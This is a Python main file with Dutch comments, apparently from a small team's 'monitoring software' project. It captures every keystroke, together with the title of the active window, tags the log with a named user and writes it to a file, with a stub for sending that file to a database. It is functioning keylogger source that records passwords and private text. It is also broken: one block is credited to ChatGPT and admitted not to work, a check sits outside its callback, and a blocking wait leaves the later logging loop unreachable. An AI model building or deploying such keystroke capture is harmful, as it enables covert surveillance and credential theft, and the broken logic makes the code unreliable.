########################################################################################################################
#               Dit is voor nu het main bestand voor de monitoringssoftware.                                           #
#               Probeer zoveel mogelijk code in functies/classes te plaatsen i.p.v. los.                               #
#               Als het nodig lijkt, bespreek met projectleden of er verschillende .py bestanden nodig zijn.           #
#               - Keano (03-04-2023)                                                                                   #
########################################################################################################################

# Hier alle library imports
import web_and_app_info_logger
import keystrokes_and_clipboard_logger
import os
import datetime
import keyboard

event_string = ''
# Hieronder de relevante code
def main():
    if os.path.isfile("keyboard_events.txt"):
        # Code voor versturen van het bestand naar DB
        print("Bestand is verstuurd naar de database!")

######################################################################### Deze code zou alle data moeten opslaan (IS VAN CHATGPT), maar houdt
    ##################################################################### 0 rekening met applicaties...
    def on_press(event):
        global event_string
        if keyboard.is_modifier(event):
            event_string = event_string + ' ' + event.name
        else:
            event_string += event.name
    if len(event_string.split()) >= 10:
        with open("keyboard_events.txt", 'a') as f:
            f.write(event_string + '\n')
            event_string = ''

    keyboard.on_press(on_press)
    keyboard.wait()


################################################################################################## Soort van werkende code
    with open("keyboard_events.txt", 'w') as f:
        f.write("Gebruiker: Keano S." + "\n")  # Keano vervangen met identificerende gebruiker
        f.write("======================================================" + "\n")
        keylogger = keystrokes_and_clipboard_logger.Keylogger()
        last_window_title = None

        # BUG: Slaat momenteel niet de keylogs op van de laatste applicatie, i.v.m. dat
        # Data pas wordt opgeslagen wanneer het laatste scherm != aan het huidige scherm
        # Andere functies van keyboard lijken niet te werken, i.v.m. beperkingen die iedere heeft.
        # Ziet er dus uit dat er altijd een zekere mate van verlies aan data zal zijn.
        while True:
            active_window, active_window_title = web_and_app_info_logger.active_window_grabber()
            if active_window_title != last_window_title and keylogger.is_recording:
                events_queue = keylogger.stop_keylogger_recording()
                relevant_keys = keylogger.get_down_keypresses(events_queue)
                f.write(f"{relevant_keys} \n")
            elif active_window_title != last_window_title and not keylogger.is_recording:
                keylogger.start_keylogger_recording()
                f.write(f"OPENED {active_window_title} ON {datetime.datetime.now()} \n")
            last_window_title = active_window_title


if __name__ == '__main__':
    main()